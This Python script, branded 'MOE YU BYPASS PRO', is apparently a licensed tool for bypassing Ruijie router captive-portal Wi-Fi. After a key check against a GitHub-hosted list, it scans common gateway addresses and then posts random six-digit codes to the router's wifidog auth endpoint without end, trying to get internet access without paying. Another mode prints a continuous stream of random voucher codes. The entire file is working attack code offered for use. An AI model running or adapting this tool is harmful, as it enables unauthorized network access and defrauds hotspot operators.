import os
import re
import sys
import uuid
import time
import json
import zlib
import base64
import random
import string
import hashlib
import asyncio
import aiohttp
import requests
import argparse
from datetime import datetime

# --- CONFIGURATION (GitHub Database Link) ---
KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
ID_STORAGE = ".moeyu_device_id"

# Colors
w, g, y, r, b, c = "\033[1;37m", "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;34m", "\033[1;36m"

def get_hwid():
    """Fixed ID ကို ဖိုင်ထဲတွင် သိမ်းထားပြီး Hardware အလိုက် ထုတ်ပေးခြင်း"""
    if os.path.exists(ID_STORAGE):
        with open(ID_STORAGE, "r") as f:
            return f.read().strip()
    else:
        user = os.popen('whoami').read().strip()
        model = os.popen('getprop ro.product.model').read().strip()
        raw = f"{user}-{model}-{uuid.uuid4().hex[:8]}"
        new_id = hashlib.md5(raw.encode()).hexdigest().upper()
        with open(ID_STORAGE, "w") as f:
            f.write(new_id)
        return new_id

def Logo():
    os.system("clear")
    my_id = get_hwid()
    logo = f"""{r}
 ███▄           ▄████▄   ▓█████  ██   ██  ██   ██ 
 ▓██ ▀█▄       ▒██    ▀  ▓█   ▀  ▒██  ██▒ ▒██  ██▒
 ▓██  ▀█▄      ▒██       ▒███     ▒██ ██░  ▒██ ██░
 ░██   █▌      ▒██    ▄  ▒▓█  ▄   ░ ▐██▓░  ░ ▐██▓░
 ░██████░      ▒ ████▀   ░▒████▒  ░ ██▒▓░  ░ ██▒▓░
{g}         ── {w}MOE YU BYPASS PRO {g}──{w}"""
    print(logo)
    print(f"{y}─" * 50)
    print(f"{g}  [👤] {w}Dev      : {y}@moeyu")
    print(f"{g}  [🆔] {w}Fixed ID : {c}{my_id}")
    print(f"{g}  [🛡️] {w}Target   : {r}Ruijie Router Only")
    print(f"{y}─" * 50)

def check_key(silent=False):
    """GitHub Database မှ License ကို စစ်ဆေးခြင်း"""
    my_id = get_hwid()
    if not silent:
        Logo()
        print(f"{y}[*] Verifying Secure License...{w}")
    try:
        headers = {'User-Agent': 'Mozilla/5.0', 'Cache-Control': 'no-cache'}
        res = requests.get(f"{KEY_URL}?t={int(time.time())}", headers=headers, timeout=15)
        
        if res.status_code == 200:
            lines = res.text.splitlines()
            for line in lines:
                if "|" in line:
                    parts = [p.strip() for p in line.strip().split("|")]
                    if len(parts) >= 2:
                        db_key, exp_str = parts[0], parts[1]
                        if db_key == my_id:
                            expiry = datetime.strptime(exp_str, "%Y-%m-%d").date()
                            if datetime.now().date() <= expiry:
                                if not silent:
                                    print(f"{g}[+] Access Authorized! Welcome Moe Yu.{w}")
                                    print(f"{g}[+] Status : {w}Premium User")
                                    print(f"{g}[+] Expiry : {y}{exp_str}{w}")
                                return True
            if not silent:
                print(f"{r}[!] UNREGISTERED ID!{w}")
                print(f"{y}[>] Your Fixed ID: {c}{my_id}{w}")
            return False
    except:
        if not silent: print(f"{r}[!] Connection Failed! Check Data.{w}")
        return False

async def BypassEngine():
    """Internet Bypass Loop Logic"""
    try:
        with open(".ip", "r") as f: ip = f.read().strip()
    except: ip = "192.168.0.1"
    
    Logo()
    print(f"{y}[*] Running Internet Bypass Loop...{w}")
    async with aiohttp.ClientSession() as s:
        while True:
            code = "".join(random.choice(string.digits) for _ in range(6))
            try:
                async with s.post(f'http://{ip}:2060/wifidog/auth?', params={'phoneNumber': code}, timeout=5) as res:
                    print(f"{w}[{datetime.now().strftime('%H:%M:%S')}] Bypass: {res.status}")
            except: pass
            await asyncio.sleep(1)

async def Generator(mode, length, speed):
    """Voucher Code Generation Logic"""
    Logo()
    print(f"{y}[*] Generating (Mode: {mode}, Speed: {speed})...{w}")
    chars = string.digits if mode == "digit" else string.ascii_letters + string.digits
    delay = 1 / speed if speed > 0 else 0.01
    while True:
        code = "".join(random.choice(chars) for _ in range(length))
        print(f"{g}[+] Code: {w}{code}")
        await asyncio.sleep(delay)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--option", choices=["internet", "setup", "code", "check"], required=True)
    parser.add_argument("-m", "--mode", default="digit")
    parser.add_argument("-l", "--length", type=int, default=6)
    parser.add_argument("-s", "--speed", type=int, default=100)
    args = parser.parse_args()

    if args.option == "check":
        check_key(silent=False)
    
    elif args.option == "setup":
        Logo()
        print(f"{y}[*] Scanning Gateway...{w}")
        gateways = ["192.168.0.1", "192.168.1.1", "192.168.99.1"]
        success = False
        for test_ip in gateways:
            try:
                r = requests.get(f"http://{test_ip}", timeout=2)
                if r.status_code == 200:
                    with open(".ip", "w") as f: f.write(test_ip)
                    print(f"{g}[+] Setup Success! Gateway: {test_ip}{w}")
                    success = True
                    break
            except: continue
        if not success:
            print(f"{r}[!] Setup Failed. Connect to Ruijie WiFi first.{w}")

    elif args.option == "internet":
        if check_key(silent=True):
            asyncio.run(BypassEngine())
        else:
            print(f"{r}[!] License Error. Run 'ju' to check ID.{w}")

    elif args.option == "code":
        asyncio.run(Generator(args.mode, args.length, args.speed))

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{r}[!] Stopped by User.{w}")
